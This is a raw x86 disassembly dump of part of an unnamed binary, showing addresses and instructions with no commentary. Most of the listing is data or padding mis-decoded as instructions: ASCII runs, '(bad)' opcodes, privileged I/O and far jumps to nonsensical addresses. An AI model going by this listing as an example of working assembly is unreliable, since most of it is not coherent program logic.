  421bd3:	dec    esi
  421bd4:	lahf   
  421bd5:	dec    edi
  421bd6:	cmp    eax,0x3c4fa04e
  421bdb:	dec    esi
  421bdc:	xor    BYTE PTR [esi+0x3f],cl
  421bdf:	dec    esi
  421be0:	pop    esp
  421be1:	in     eax,dx
  421be2:	pop    edi
  421be3:	loop   0x421c54
  421be5:	repnz outs dx,BYTE PTR ds:[esi]
  421be7:	repz jle 0x421bed
  421bea:	jns    0x421bec
  421bec:	jle    0x421c01
  421bee:	jns    0x421c00
  421bf0:	cmp    al,0x4e
  421bf2:	jg     0x421c42
  421bf4:	xor    BYTE PTR [esi-0x65],cl
  421bf7:	dec    edi
  421bf8:	xor    cl,BYTE PTR [esi-0x80]
  421bfb:	dec    edi
  421bfc:	cmp    al,0x4e
  421bfe:	lods   eax,DWORD PTR ds:[esi]
  421bff:	dec    edi
  421c00:	cmp    ecx,DWORD PTR [esi+0x30]
  421c03:	dec    esi
  421c04:	inc    ebp
  421c05:	dec    esi
  421c06:	pop    esp
  421c07:	or     eax,0x126f025f
  421c0c:	outs   dx,BYTE PTR ds:[esi]
  421c0d:	adc    edi,DWORD PTR [esi+0x23]
  421c10:	jns    0x421c32
  421c12:	aas    
  421c13:	dec    esi
  421c14:	add    BYTE PTR [eax],al
  421c16:	sahf   
  421c17:	sbb    al,BYTE PTR [edx+0x0]
  421c1a:	xchg   edx,eax
  421c1b:	sbb    al,0x42
  421c1d:	add    BYTE PTR [edx+0x4200421c],bl
  421c23:	push   ds
  421c24:	inc    edx
  421c25:	add    BYTE PTR [esi+0x3200421d],ch
  421c2b:	push   ds
  421c2c:	inc    edx
  421c2d:	add    BYTE PTR [edx+0x1c],bh
  421c30:	inc    edx
  421c31:	add    BYTE PTR [esi+0x1c],bh
  421c34:	inc    edx
  421c35:	add    BYTE PTR [esi],ch
  421c37:	push   ds
  421c38:	inc    edx
  421c39:	add    dl,ah
  421c3b:	sbb    al,0x42
  421c3d:	add    BYTE PTR ds:0x36f89ca9,cl
  421c43:	mov    edx,0x1c96f89c
  421c48:	inc    edx
  421c49:	add    BYTE PTR [esi+0x1d],ah
  421c4c:	inc    edx
  421c4d:	add    BYTE PTR [edx+0x1d],bh
  421c50:	inc    edx
  421c51:	add    BYTE PTR [esi-0x69ffbde3],al
  421c57:	sbb    eax,0x1cce0042
  421c5c:	inc    edx
  421c5d:	add    BYTE PTR [edx-0x11ffbde6],bl
  421c63:	sbb    al,0x42
  421c65:	add    dh,bl
  421c67:	sbb    al,0x42
  421c69:	add    BYTE PTR [esi+0x1e],al
  421c6c:	inc    edx
  421c6d:	add    BYTE PTR [esi+0x19f89c85],dh
  421c73:	or     edx,DWORD PTR [edi]
  421c75:	and    DWORD PTR [edx+0x1400421c],0x881161c
  421c7f:	or     eax,0x705
  421c84:	inc    eax
  421c85:	add    BYTE PTR [edx],bh
  421c87:	inc    edx
  421c88:	ds ds enter 0x4279,0x0
  421c8e:	ins    DWORD PTR es:[edi],dx
  421c8f:	push   ebp
  421c90:	inc    esp
  421c91:	imul   ecx,DWORD PTR [eax],0x86275fa
  421c97:	in     eax,dx
  421c98:	inc    BYTE PTR [edi]
  421c9a:	aas    
  421c9b:	cli    
  421c9c:	mov    ds:0x421c8a05,eax
  421ca1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421ca7:	xchg   esi,eax
  421ca8:	pushf  
  421ca9:	clc    
  421caa:	mov    ah,0x95
  421cac:	pushf  
  421cad:	clc    
  421cae:	mov    ebx,0xbaf89c95
  421cb3:	xchg   ebp,eax
  421cb4:	pushf  
  421cb5:	clc    
  421cb6:	mov    ecx,0xb8f89c95
  421cbb:	xchg   ebp,eax
  421cbc:	pushf  
  421cbd:	clc    
  421cbe:	mov    edi,0xbef89c95
  421cc3:	xchg   ebp,eax
  421cc4:	pushf  
  421cc5:	clc    
  421cc6:	mov    ebp,0xa6f89c95
  421ccb:	xchg   ebp,eax
  421ccc:	pushf  
  421ccd:	clc    
  421cce:	jmp    0x421a:0x926003f9
  421cd5:	add    BYTE PTR [eax+eax*2+0x42],ch
  421cd9:	add    BYTE PTR [ebx+0x77],dl
  421cdc:	jbe    0x421d2e
  421cde:	mov    dh,0x85
  421ce0:	pushf  
  421ce1:	clc    
  421ce2:	sbb    ecx,ebp
  421ce4:	push   eax
  421ce5:	pop    es
  421ce6:	sbb    BYTE PTR [ebx],cl
  421ce8:	add    BYTE PTR [eax],al
  421cea:	mov    ds,WORD PTR [edx]
  421cec:	inc    edx
  421ced:	add    BYTE PTR [ebx],bl
  421cef:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d22:	ins    BYTE PTR es:[edi],dx
  421d23:	inc    eax
  421d24:	inc    edx
  421d25:	add    BYTE PTR [esi+0x66f89c85],dh
  421d2b:	add    BYTE PTR [edx+0x0],ch
  421d2e:	add    BYTE PTR [si+0x0],ah
  421d32:	push   0x64006700
  421d37:	add    BYTE PTR [esi+0x0],ah
  421d3a:	push   0x0
  421d3c:	push   0x66006400
  421d41:	add    BYTE PTR [edi+0x0],ah
  421d44:	push   0x0
  421d46:	push   0x66006700
  421d4b:	add    BYTE PTR [eax+0x0],ch
  421d4e:	add    BYTE PTR [bp+0x0],ah
  421d52:	push   0x66006700
	...
  421d5f:	add    BYTE PTR [eax],al
  421d61:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421d67:	dec    edi
  421d68:	lahf   
  421d69:	dec    edi
  421d6a:	mov    ds:0x9f4fa64f,al
  421d6f:	dec    edi
  421d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d71:	dec    edi
  421d72:	ins    DWORD PTR es:[edi],dx
  421d73:	dec    esi
  421d74:	bound  ecx,QWORD PTR [esi+0x30]
  421d77:	dec    esi
  421d78:	add    BYTE PTR [eax],al
  421d7a:	cdq    
  421d7b:	dec    edi
  421d7c:	pushf  
  421d7d:	dec    edi
  421d7e:	fwait
  421d7f:	dec    edi
  421d80:	ins    DWORD PTR es:[edi],dx
  421d81:	dec    esi
  421d82:	bound  ecx,QWORD PTR [esi+0x30]
  421d85:	dec    esi
  421d86:	scas   eax,DWORD PTR es:[edi]
  421d87:	dec    edi
  421d88:	lods   eax,DWORD PTR ds:[esi]
  421d89:	dec    edi
  421d8a:	lahf   
  421d8b:	dec    edi
  421d8c:	mov    ds:0x624e6d4f,al
  421d91:	dec    esi
  421d92:	xor    BYTE PTR [esi+0x0],cl
  421d95:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421d9b:	dec    edi
  421d9c:	test   eax,0xa04f934f
  421da1:	dec    edi
  421da2:	fwait
  421da3:	dec    edi
  421da4:	xor    BYTE PTR [esi+0x0],cl
  421da7:	add    BYTE PTR [eax],al
  421da9:	add    BYTE PTR [eax],al
  421dab:	add    BYTE PTR [eax],al
  421dad:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421db4:	mov    WORD PTR [ebp-0x32734274],gs
  421dba:	mov    ebp,ds
  421dbc:	mov    ebp,gs
  421dbe:	mov    ebp,?
  421dc0:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421dc6:	mov    WORD PTR ds:0x6d8c5d8c,?
  421dcc:	mov    WORD PTR [edx-0x74],?
  421dcf:	jae    0x421d5d
  421dd1:	jo     0x421d5f
  421dd3:	jno    0x421d61
  421dd5:	jbe    0x421d63
  421dd7:	ja     0x421d65
  421dd9:	je     0x421d67
  421ddb:	jne    0x421d69
  421ddd:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421de4:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421dea:	lods   al,BYTE PTR ds:[esi]
  421deb:	jge    0x421da9
  421ded:	jge    0x421d8d
  421def:	(bad)  
  421df0:	jns    0x421e65
  421df2:	mov    ecx,0x7d738cb1
  421df7:	ins    DWORD PTR es:[edi],dx
  421df8:	enter  0x9fc6,0x26
  421dfc:	jb     0x421e01
  421dfe:	test   eax,0xb956bb17
  421e03:	hlt    
  421e04:	test   al,0x37
  421e06:	test   al,0x7e
  421e08:	fnstenv [ecx-0x6a]
  421e0b:	mov    cl,0x6a
  421e0d:	push   0xffffffce
  421e0f:	or     BYTE PTR [edx],bl
  421e11:	xlat   BYTE PTR ds:[ebx]
  421e12:	out    dx,eax
  421e13:	add    eax,0x9321d7aa
  421e18:	scas   al,BYTE PTR es:[edi]
  421e19:	adc    DWORD PTR [esi],esp
  421e1b:	jge    0x421e40
  421e1d:	fidiv  WORD PTR [edi]
  421e1f:	leave  
  421e20:	hlt    
  421e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e22:	cmp    ax,0x1fc8
  421e26:	mov    dh,cl
  421e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e29:	(bad)  
  421e2a:	and    DWORD PTR [eax],ebx
  421e2c:	and    DWORD PTR [ecx-0x18],esi
  421e2f:	(bad)  [ebx+0x7]
  421e32:	cmc    
  421e33:	enter  0x301a,0x14
  421e37:	inc    eax
  421e38:	inc    edx
  421e39:	add    BYTE PTR [ecx+0x66],dh
  421e3c:	jp     0x421eac
  421e3e:	sbb    BYTE PTR [edx+eax*2],0x0
  421e42:	out    0x1c,al
  421e44:	inc    edx
  421e45:	add    BYTE PTR [eax],cl
  421e47:	in     eax,dx
  421e48:	adc    al,BYTE PTR [edi]
  421e4a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e51:	ins    BYTE PTR es:[edi],dx
  421e52:	push   0x49657557
  421e57:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e5d:	push   edi
  421e5e:	jp     0x421eda
  421e60:	dec    ebp
  421e61:	push   esi
  421e62:	arpl   WORD PTR gs:[ecx+0x45],si
  421e66:	dec    edx
  421e67:	dec    esi
  421e68:	data16 ja 0x421eb9
  421e6b:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421e86:	inc    ebp
  421e87:	push   edx
  421e88:	jb     0x421efe
  421e8a:	inc    esi
  421e8b:	je     0x421ece
  421e8d:	inc    esi
  421e8e:	jae    0x421f06
  421e90:	dec    ebx
  421e91:	gs dec ecx
  421e93:	dec    ebp
  421e94:	dec    ebp
  421e95:	pop    edx
  421e96:	jp     0x421ef2
  421e98:	jbe    0x421ee0
  421e9a:	pop    ecx
  421e9b:	jo     0x421f15
  421e9d:	inc    edi
  421e9e:	gs ins BYTE PTR es:[edi],dx
  421ea0:	dec    esp
  421ea1:	js     0x421f0b
  421ea3:	inc    edx
  421ea4:	js     0x421eec
  421ea6:	dec    eax
  421ea7:	inc    ebp
  421ea8:	inc    esp
  421ea9:	inc    esp
  421eaa:	push   ecx
  421eab:	dec    edx
  421eac:	ins    BYTE PTR es:[edi],dx
  421ead:	dec    ebx
  421eae:	jbe    0x421f1e
  421eb0:	pop    eax
  421eb1:	jbe    0x421efe
  421eb3:	inc    ecx
  421eb4:	fs gs jno 0x421f25
  421eb8:	push   ebx
  421eb9:	inc    ecx
  421eba:	add    BYTE PTR [eax],al
  421ebc:	inc    ebx
  421ebd:	outs   dx,BYTE PTR ds:[esi]
  421ebe:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421ec2:	push   edx
  421ec3:	push   ecx
  421ec4:	push   0x74000064
  421ec9:	jne    0x421f40
  421ecb:	ins    DWORD PTR es:[edi],dx
  421ecc:	push   ecx
  421ecd:	push   eax
  421ece:	jo     0x421f4a
  421ed0:	addr16 jo 0x421f29
  421ed3:	pop    eax
  421ed4:	add    BYTE PTR [eax],al
  421ed6:	push   ecx
  421ed7:	pop    ecx
  421ed8:	inc    ebx
  421ed9:	inc    edx
  421eda:	outs   dx,BYTE PTR ds:[esi]
  421edb:	popa   
  421edc:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421ee0:	jne    0x421f50
  421ee2:	dec    ebx
  421ee3:	je     0x421f48
  421ee5:	bound  esp,QWORD PTR [edi+0x0]
  421ee8:	jns    0x421f2f
  421eea:	bound  ebp,QWORD PTR [ecx+0x46]
  421eed:	dec    ecx
  421eee:	ja     0x421f35
  421ef0:	dec    eax
  421ef1:	inc    ebp
  421ef2:	inc    edx
  421ef3:	push   ebx
  421ef4:	add    BYTE PTR [eax],al
  421ef6:	outs   dx,DWORD PTR ds:[esi]
  421ef7:	inc    edi
  421ef8:	dec    esi
  421ef9:	outs   dx,DWORD PTR ds:[esi]
  421efa:	pop    ecx
  421efb:	inc    edi
  421efc:	jb     0x421f45
  421efe:	jns    0x421f76
  421f00:	inc    ecx
  421f01:	pop    eax
  421f02:	dec    esp
  421f03:	add    BYTE PTR [eax+0x48],bh
  421f06:	bound  edx,QWORD PTR [ebx+0x43]
  421f09:	pop    eax
  421f0a:	outs   dx,DWORD PTR ds:[esi]
  421f0b:	push   0x4355
  421f10:	dec    esp
  421f11:	ins    BYTE PTR es:[edi],dx
  421f12:	inc    edx
  421f13:	push   0x76666a73
  421f18:	inc    edx
  421f19:	jo     0x421f1b
  421f1b:	add    BYTE PTR [eax],al
  421f1d:	add    BYTE PTR [edi+0x6d],ah
  421f20:	je     0x421f69
  421f22:	ins    BYTE PTR es:[edi],dx
  421f23:	jae    0x421f8f
  421f25:	inc    esi
  421f26:	ins    DWORD PTR es:[edi],dx
  421f27:	je     0x421f7f
  421f29:	push   0x56584178
  421f2e:	push   ebx
  421f2f:	addr16 dec edx
  421f31:	jo     0x421fa5
  421f33:	js     0x421fa4
  421f35:	pop    eax
  421f36:	dec    ebx
  421f37:	push   esp
  421f38:	dec    esp
  421f39:	jns    0x421f86
  421f3b:	js     0x421fb5
  421f3d:	outs   dx,BYTE PTR ds:[esi]
  421f3e:	pop    ecx
  421f3f:	jae    0x421faf
  421f41:	push   0x43644448
  421f46:	arpl   WORD PTR [edx+0x55],sp
  421f49:	push   0x42504e67
  421f4e:	push   ebp
  421f4f:	je     0x421fc6
  421f51:	addr16 dec edi
  421f53:	dec    esp
  421f54:	inc    edx
  421f55:	ins    DWORD PTR es:[edi],dx
  421f56:	inc    esi
  421f57:	inc    esi
  421f58:	inc    esi
  421f59:	arpl   WORD PTR [edx+0x47],bx
  421f5c:	push   ebp
  421f5d:	inc    ebx
  421f5e:	popa   
  421f5f:	push   edx
  421f60:	dec    esp
  421f61:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421f68:	push   ecx
  421f69:	push   ebx
  421f6a:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421f71:	dec    edx
  421f72:	jns    0x421fdd
  421f74:	push   edx
  421f75:	inc    ebx
  421f76:	jo     0x421fed
  421f78:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421f7c:	fs push ebx
  421f7e:	inc    ebx
  421f7f:	push   ebp
  421f80:	push   eax
  421f81:	ja     0x421fbe
  421f83:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421f87:	mov    ebp,0xa53ddffb
  421f8c:	js     0x421f47
  421f8e:	jecxz  0x421f30
  421f90:	or     ah,BYTE PTR [ecx+ecx*1+0x620001d7]
  421f97:	add    BYTE PTR [eax],al
  421f99:	add    BYTE PTR [ecx],ch
  421f9b:	xchg   DWORD PTR [edi],edi
  421f9d:	inc    edx
  421f9e:	push   cs
  421f9f:	push   ebx
  421fa0:	jmp    DWORD PTR [eax-0x6be973e0]
  421fa6:	sub    ch,BYTE PTR [edx]
  421fa8:	push   ebp
  421fa9:	xchg   edi,eax
  421faa:	test   DWORD PTR [edx],edx
  421fac:	dec    eax
  421fad:	cs push edx
  421faf:	xchg   edx,eax
  421fb0:	arpl   WORD PTR [ecx+0x18],dx
  421fb3:	test   al,0x42
  421fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fb6:	inc    edx
  421fb7:	xchg   esi,eax
  421fb8:	mov    ah,0xc2
  421fba:	imul   BYTE PTR [esi]
  421fbc:	add    al,0x6
  421fbe:	add    al,0x39
  421fc0:	push   ds
  421fc1:	sub    BYTE PTR [esi-0x2967fa53],al
  421fc7:	or     DWORD PTR [ebx+0x22791f08],ecx
  421fcd:	cdq    
  421fce:	and    eax,0x194410c8
  421fd3:	or     bh,BYTE PTR [ebx]
  421fd5:	jmp    FWORD PTR [ebx+0x331cab06]
  421fdb:	adc    DWORD PTR [eax-0x73f4bf76],edi
  421fe1:	stos   DWORD PTR es:[edi],eax
  421fe2:	pop    esp
  421fe3:	aam    0xa3
  421fe5:	out    0xb8,al
  421fe7:	mov    bl,0xe9
  421fe9:	aas    
  421fea:	xchg   esp,eax
  421feb:	lods   eax,DWORD PTR ds:[esi]
  421fec:	sbb    eax,0x593b324e
  421ff1:	out    0x43,eax
  421ff3:	lock add al,0xc4
  421ff6:	cs ret 0xb825
  421ffa:	sbb    BYTE PTR [ecx],bh
  421ffc:	add    BYTE PTR [eax],al
  421ffe:	add    BYTE PTR [eax],al
  422000:	add    BYTE PTR [eax],al
  422002:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422008:	(bad)  
  422009:	cli    
  42200a:	jl     0x422070
  42200c:	xlat   BYTE PTR ds:[ebx]
  42200d:	push   esi
  42200e:	inc    ebp
  42200f:	jne    0x421fdb
  422011:	sub    BYTE PTR [ebx-0x29],0x1
  422015:	add    BYTE PTR [edx+0x0],ah
  422018:	add    BYTE PTR [eax],al
  42201a:	mov    eax,ds:0xae2a067d
  42201f:	mov    ebp,0x340d2f51
  422024:	(bad)  ds:0x6f6d8d62
  42202a:	in     al,dx
  42202b:	jecxz  0x421fec
  42202d:	jl     0x42206e
  42202f:	mov    al,ds:0xc592f3e4
  422034:	mov    ecx,0xe79676b3
  422039:	jmp    0x867d6a0d
  42203e:	aam    0x92
  422040:	xchg   edx,eax
  422041:	pop    es
  422042:	and    esp,DWORD PTR [eax+0x48]
  422045:	mov    ebx,0x8ac7d273
  42204a:	mov    ds:0xc5d6cc64,eax
  42204f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422050:	inc    edi
  422051:	pop    ecx
  422052:	pop    esp
  422053:	sub    ah,BYTE PTR [edx-0x25983c1d]
  422059:	sub    DWORD PTR [edx+0x1],edx
  42205c:	ror    cl,0x9e
  42205f:	pop    ss
  422060:	adc    al,0xd3
  422062:	rol    esp,0x88
  422065:	ror    DWORD PTR [ecx],1
  422067:	sbb    al,0x5b
  422069:	ins    DWORD PTR es:[edi],dx
  42206a:	mov    DWORD PTR [ecx+edx*8-0x6e],ecx
  42206e:	and    al,0x21
  422070:	push   ebp
  422071:	adc    al,0xee
  422073:	div    DWORD PTR [esi+0x34]
  422076:	sub    bl,dh
  422078:	cwde   
  422079:	aam    0x58
  42207b:	fiadd  WORD PTR [eax]
  42207d:	add    BYTE PTR [eax],al
  42207f:	add    BYTE PTR [eax],al
  422081:	add    BYTE PTR [ebx-0x7e80ab],dh
  422087:	stos   DWORD PTR es:[edi],eax
  422088:	push   DWORD PTR [edi-0x42]
  42208b:	xchg   esi,eax
  42208c:	push   0x533e3d57
  422091:	out    dx,al
  422092:	int    0xd7
  422094:	add    DWORD PTR [eax],eax
  422096:	bound  eax,QWORD PTR [eax]
  422098:	add    BYTE PTR [eax],al
  42209a:	icebp  
  42209b:	les    ebx,FWORD PTR [eax]
  42209d:	int    0x2
  42209f:	dec    eax
  4220a0:	jno    0x422082
  4220a2:	jmp    0xdfe99ecb
  4220a7:	repz mov ds,WORD PTR [eax]
  4220aa:	adc    cl,bl
  4220ac:	push   esi
  4220ad:	sbb    edx,ebx
  4220af:	enter  0xe877,0xdb
  4220b3:	dec    ecx
  4220b4:	dec    esp
  4220b5:	out    0xa9,eax
  4220b7:	push   es
  4220b8:	push   esi
  4220b9:	mov    al,0xab
  4220bb:	push   esp
  4220bc:	pop    esi
  4220bd:	push   ecx
  4220be:	add    DWORD PTR ds:0xbded62c8,ecx
  4220c4:	jle    0x422076
  4220c6:	pop    ss
  4220c7:	mov    esi,0xe670c857
  4220cc:	sbb    DWORD PTR [eax-0x42],esp
  4220cf:	mov    ecx,0xb07778d9
  4220d4:	arpl   WORD PTR [eax+0x59db7138],bx
  4220da:	push   ebx
  4220db:	cs mov bl,ch
  4220de:	out    0xd1,al
  4220e0:	aas    
  4220e1:	push   edx
  4220e2:	call   0x1d2f:0x58651998
  4220e9:	jnp    0x422110
  4220eb:	mov    dl,0x13
  4220ed:	fisub  DWORD PTR [esi+0x720a3daf]
  4220f3:	fistp  WORD PTR ds:0xb2987fcb
  4220f9:	loop   0x4220a8
  4220fb:	xor    al,0x0
  4220fd:	add    BYTE PTR [eax],al
  4220ff:	add    BYTE PTR [eax],al
  422101:	add    BYTE PTR [eax],bh
  422103:	(bad)  
  422104:	cmp    ah,BYTE PTR [esi+edi*8]
  422107:	in     al,dx
  422108:	fimul  WORD PTR ds:[edi-0x6b53942b]
  42210f:	les    edx,FWORD PTR [esi+edi*8+0x1d82f]
  422116:	bound  eax,QWORD PTR [eax]
  422118:	add    BYTE PTR [eax],al
  42211a:	call   esp
  42211c:	lock pop bx
  42211f:	add    eax,0xe5c2385b
  422124:	cmp    al,0x3b
  422126:	inc    edx
  422127:	add    al,0x2e
  422129:	or     eax,0xf13b9409
  42212e:	xchg   ebp,eax
  42212f:	or     BYTE PTR [ebx-0x11],al
  422132:	fdiv   st(1),st
  422134:	and    eax,0x934b51ac
  422139:	jb     0x422150
  42213b:	out    dx,eax
  42213c:	cli    
  42213d:	or     BYTE PTR [ebx+0x73],cl
  422140:	xor    DWORD PTR [edx-0x6d],0x85267231
  422147:	jge    0x4220e6
  422149:	and    BYTE PTR [edi],ch
  42214b:	jle    0x4221b1
  42214d:	jmp    0x422115
  42214f:	ja     0x422140
  422151:	jo     0x422109
  422153:	inc    edi
  422154:	mov    al,0xe1
  422156:	loopne 0x42218d
  422158:	outs   dx,BYTE PTR ds:[esi]
  422159:	out    0xa4,eax
  42215b:	sbb    BYTE PTR [eax+0x7a94e787],dl
  422161:	jle    0x42218b
  422163:	daa    
  422164:	and    al,BYTE PTR [ebx-0x14]
  422167:	mov    al,ds:0xac41dcc2
  42216c:	push   es
  42216d:	outs   dx,BYTE PTR ds:[esi]
  42216e:	push   0x54f1d85
  422173:	(bad)  
  422174:	push   edx
  422175:	in     al,dx
  422176:	and    eax,0x2fb10499
  42217b:	ins    BYTE PTR es:[edi],dx
  42217c:	add    BYTE PTR [eax],al
  42217e:	add    BYTE PTR [eax],al
  422180:	add    BYTE PTR [eax],al
  422182:	fnstenv [esi-0x2490e49a]
  422188:	std    
  422189:	neg    BYTE PTR [esi]
  42218b:	sub    esp,DWORD PTR [ebx-0x23]
  42218e:	fwait
  42218f:	div    BYTE PTR [edi+0x1d891d5]
  422195:	add    BYTE PTR [edx+0x0],ah
  422198:	add    BYTE PTR [eax],al
  42219a:	mov    ebx,0x1644a46b
  42219f:	aaa    
  4221a0:	repnz mov al,0x7e
  4221a3:	dec    esi
  4221a4:	fisttp QWORD PTR [ecx]
  4221a6:	sub    ch,BYTE PTR [ebp-0x4d9831ec]
  4221ac:	mov    ecx,0xa5600ed0
  4221b1:	pusha  
  4221b2:	retf   0x1524
  4221b5:	mov    bl,0x9a
  4221b7:	pop    ebp
  4221b8:	pusha  
  4221b9:	adc    eax,0x210f252b
  4221be:	aam    0xde
  4221c0:	dec    ebp
  4221c1:	jo     0x4221b5
  4221c3:	dec    edx
  4221c4:	fwait
  4221c5:	inc    esp
  4221c6:	scas   al,BYTE PTR es:[edi]
  4221c7:	xor    ebp,0x60
  4221ca:	push   edi
  4221cb:	shr    ch,1
  4221cd:	adc    BYTE PTR [ebp+eiz*4-0x80],cl
  4221d1:	cwde   
  4221d2:	adc    BYTE PTR [bp+si+0x3c46],dl
  4221d7:	jl     0x4221b4
  4221d9:	repz dec ecx
  4221db:	push   ebx
  4221dc:	loope  0x42223b
  4221de:	mov    ebp,0x878b2a05
  4221e3:	dec    esi
  4221e4:	dec    edx
  4221e5:	js     0x4221a7
  4221e7:	xor    eax,0xbe15963
  4221ec:	gs adc bl,bh
  4221ef:	call   0x1641:0x39b6bb69
  4221f6:	test   DWORD PTR [edi+0x14],ecx
  4221f9:	push   0x7520
  4221fe:	add    BYTE PTR [eax],al
  422200:	add    BYTE PTR [eax],al
  422202:	fidiv  DWORD PTR [edx]
  422204:	xchg   edi,eax
  422205:	mov    bh,bh
  422207:	scas   eax,DWORD PTR es:[edi]
  422208:	fbstp  TBYTE PTR [edx+0x3]
  42220b:	inc    ebp
  42220c:	mov    ds:0x4d78505c,eax
  422211:	xor    ebx,0xffffffd8
  422214:	add    DWORD PTR [eax],eax
  422216:	bound  eax,QWORD PTR [eax]
  422218:	add    BYTE PTR [eax],al
  42221a:	iret   
  42221b:	add    eax,DWORD PTR [edi+0x3f]
  42221e:	scas   al,BYTE PTR es:[edi]
  42221f:	popf   
  422220:	les    ebx,FWORD PTR [eax+0x3b]
  422223:	(bad)  
  422224:	lods   eax,DWORD PTR ds:[esi]
  422225:	push   esi
  422226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422227:	mov    esi,0xf4eaf363
  42222c:	and    dl,cl
  42222e:	push   ebx
  42222f:	mov    fs,WORD PTR [edi]
  422231:	pop    edx
  422232:	sub    ch,BYTE PTR [edx]
  422234:	lds    esp,FWORD PTR [ecx-0x4f]
  422237:	xor    eax,0xf41e44ce
  42223c:	lds    edx,FWORD PTR [ebx+ecx*1-0x621f0fd6]
  422243:	and    DWORD PTR [ebx],eax
  422245:	or     DWORD PTR [ebp+edi*2-0x35c046dd],eax
  42224c:	mov    ebp,0x74316a42
  422251:	push   esp
  422252:	ss jo  0x4222ba
  422255:	stos   DWORD PTR es:[edi],eax
  422256:	ja     0x4222b2
  422258:	adc    eax,0x8280ad17
  42225d:	cli    
  42225e:	mov    ch,0x37
  422260:	push   edx
  422261:	rcl    BYTE PTR [esi],1
  422263:	push   0x17a57630
  422268:	push   es
  422269:	aam    0x80
  42226b:	out    dx,al
  42226c:	bndldx bnd3,[edi-0x7b]
  422270:	daa    
  422271:	or     BYTE PTR [edi],ch
  422273:	sub    al,0xc7
  422275:	push   edi
  422276:	xchg   DWORD PTR [ebp-0x32],eax
  422279:	xchg   edx,eax
  42227a:	div    DWORD PTR [ebp+0x0]
  422280:	add    BYTE PTR [eax],al
  422282:	dec    eax
  422283:	in     al,0x3
  422285:	fwait
  422286:	scas   eax,DWORD PTR es:[edi]
  422287:	(bad)  
  422288:	fdiv   st,st(7)
  42228a:	pop    esi
  42228b:	sub    BYTE PTR [eax-0x474cb171],bl
  422291:	mov    ecx,0x1d955
  422296:	bound  eax,QWORD PTR [eax]
  422298:	add    BYTE PTR [eax],al
  42229a:	mov    ah,BYTE PTR [ecx-0x7a]
  42229d:	pop    ss
  42229e:	cmp    DWORD PTR [ecx+0x17],edi
  4222a1:	fxch   st(1)
  4222a3:	mov    ebp,esi
  4222a5:	cmp    al,0xe6
  4222a7:	pop    esp
  4222a8:	retf   
  4222a9:	xor    DWORD PTR [edx],ebp
  4222ab:	int3   
  4222ac:	retf   
  4222ad:	sub    eax,0xec8504b3
  4222b2:	shl    DWORD PTR [edx],0xef
  4222b5:	outs   dx,DWORD PTR ds:[esi]
  4222b6:	outs   dx,BYTE PTR ds:[esi]
  4222b7:	mov    eax,ds
  4222b9:	push   0xeffcdf1b
  4222be:	jmp    0xb804:0x57898639
  4222c5:	mov    edi,0xf69e83e0
  4222ca:	rcr    DWORD PTR [edi+ebp*2],1
  4222cd:	xor    DWORD PTR [ecx],ecx
  4222cf:	test   al,0x91
  4222d1:	in     eax,0xcc
  4222d3:	mov    ds:0x25b7968d,al
  4222d8:	mov    ebx,0xc351284f
  4222dd:	scas   eax,DWORD PTR es:[edi]
  4222de:	dec    edx
  4222df:	inc    ebx
  4222e0:	(bad)  
  4222e1:	call   FWORD PTR [esi+0x4f]
  4222e4:	ins    BYTE PTR es:[edi],dx
  4222e5:	dec    ecx
  4222e6:	in     eax,0x73
  4222e8:	add    edi,DWORD PTR [ecx-0x20f9140c]
  4222ee:	imul   ecx,DWORD PTR ds:0x94094377,0x99a46e9d
  4222f8:	cli    
  4222f9:	mov    ebx,0xf503
  4222fe:	add    BYTE PTR [eax],al
  422300:	add    BYTE PTR [eax],al
  422302:	push   edx
  422303:	add    al,0xa2
  422305:	xor    dh,0xa6
  422308:	jb     0x4222de
  42230a:	ins    DWORD PTR es:[edi],dx
  42230b:	xor    dh,BYTE PTR [edx]
  42230d:	and    eax,0x6a63c1d1
  422312:	mov    bh,0xd9
  422314:	add    DWORD PTR [eax],eax
  422316:	bound  eax,QWORD PTR [eax]
  422318:	add    BYTE PTR [eax],al
  42231a:	xchg   ebp,eax
  42231b:	ficom  WORD PTR [edi-0x1d0628f0]
  422321:	inc    ebx
  422322:	xchg   BYTE PTR cs:[edi-0x18],ah
  422326:	sti    
  422327:	mov    dl,0x53
  422329:	popf   
  42232a:	dec    eax
  42232b:	xor    DWORD PTR [edi],edi
  42232d:	mov    al,0x5d
  42232f:	popf   
  422330:	stos   BYTE PTR es:[edi],al
  422331:	shl    DWORD PTR [ebx],1
  422333:	outs   dx,DWORD PTR ds:[esi]
  422334:	xchg   dh,bl
  422336:	sub    al,0x98
  422338:	sar    BYTE PTR [edi+esi*4-0x12],cl
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	push   esp
  42233e:	mov    cl,0x83
  422340:	mov    ch,0x75
  422342:	xor    dl,dh
  422344:	pop    esi
  422345:	mov    edx,0xf4491aa
  42234a:	push   ds
  42234b:	and    dl,ah
  42234d:	dec    ebx
  42234e:	jmp    0x21fc9ef2
  422353:	xlat   BYTE PTR ds:[ebx]
  422354:	adc    ah,bl
  422356:	jno    0x4222e6
  422358:	xor    eax,0xdceb3183
  42235d:	ja     0x422328
  42235f:	sub    bh,cl
